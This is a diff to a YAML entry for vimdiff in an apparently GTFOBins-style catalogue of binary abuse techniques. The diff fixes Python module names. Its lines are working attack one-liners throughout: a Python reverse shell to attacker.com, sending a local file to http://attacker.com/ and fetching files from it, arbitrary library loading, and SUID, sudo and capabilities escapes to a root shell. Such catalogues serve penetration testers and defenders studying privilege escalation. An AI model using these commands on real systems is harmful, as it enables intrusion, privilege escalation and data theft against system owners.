@@ -15,11 +15,11 @@ functions:
       code: |
         export RHOST=attacker.com
         export RPORT=12345
-        vimdiff -c ':py import vdiff,sys,socket,os,pty;s=socket.socket()
+        vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
         s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
         [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")
-        vimdiff.command(":q!")'
+        vim.command(":q!")'
   non-interactive-reverse-shell:
     - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
       code: |
@@ -48,19 +48,19 @@ functions:
       code: |
         export URL=http://attacker.com/
         export LFILE=file_to_send
-        vimdiff -c ':py import vdiff,sys; from os import environ as e
+        vimdiff -c ':py import vim,sys; from os import environ as e
         if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
         else: import urllib as u, urllib2 as r
         r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
-        vimdiff.command(":q!")'
+        vim.command(":q!")'
     - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
       code: |
         export LPORT=8888
-        vimdiff -c ':py import vimdiff,sys; from os import environ as e
+        vimdiff -c ':py import vim,sys; from os import environ as e
         if sys.version_info.major == 3: import http.server as s, socketserver as ss
         else: import SimpleHTTPServer as s, SocketServer as ss
         ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
-        vimdiff.command(":q!")'
+        vim.command(":q!")'
     - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
       code: |
         export RHOST=attacker.com
@@ -79,11 +79,11 @@ functions:
       code: |
         export URL=http://attacker.com/file_to_get
         export LFILE=file_to_save
-        vimdiff -c ':py import vdiff,sys; from os import environ as e
+        vimdiff -c ':py import vim,sys; from os import environ as e
         if sys.version_info.major == 3: import urllib.request as r
         else: import urllib as r
         r.urlretrieve(e["URL"], e["LFILE"])
-        vimdiff.command(":q!")'
+        vim.command(":q!")'
     - description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
       code: |
         export LPORT=12345
@@ -106,7 +106,7 @@ functions:
     - code: vimdiff file_to_read
   library-load:
     - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
-      code: vimdiff -c ':py import vdiff; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vimdiff.command(":q!")'
+      code: vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
   suid:
     - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
       code: ./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
@@ -118,7 +118,7 @@ functions:
       code: sudo vimdiff -c ':lua os.execute("reset; exec sh")'
   capabilities:
     - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
-      code: ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' 
+      code: ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
   limited-suid:
     - description: This requires that `vimdiff` is compiled with Lua support.
       code: ./vimdiff -c ':lua os.execute("reset; exec sh")'
